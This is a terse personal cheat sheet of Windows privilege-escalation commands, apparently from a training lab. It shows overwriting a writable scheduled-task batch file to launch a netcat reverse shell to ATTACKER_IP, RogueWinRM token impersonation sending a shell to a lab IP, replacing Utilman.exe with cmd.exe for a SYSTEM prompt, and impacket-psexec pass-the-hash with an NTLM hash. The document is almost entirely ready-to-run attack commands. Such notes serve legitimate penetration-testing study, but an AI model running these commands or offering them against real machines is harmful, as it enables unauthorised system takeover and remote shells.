# sheduled task (like crond on linux)
```
schtasks /query /tn vulntask /fo list /v
```
check permissions
```
icacls c:\tasks\file
```
`c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)`
As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. For your convenience, nc64.exe can be found on C:\tools. Let's change the bat file to spawn a reverse shell:
```
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\<taskfile>
```
## run a task
```
schtasks /run /tn <taskname>
```
# privilege
## SetImpersonate / SeAssignPrimaryToken
```
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe 10.10.65.95 4444"
```
## SeTakeOwnership
```
takeown /f C:\Windows\System32\Utilman.exe
```
```
icacls C:\Windows\System32\Utilman.exe /grant <actualUser>:F
```
```
 copy cmd.exe utilman.exe
```
 lock our screen from the start button and  proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges.
# Unpatched software
list installed programms
```
wmic product get name,version,vendor
```

#*└─#* (get admin shell)
```
impacket-psexec -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.129.95.210

```
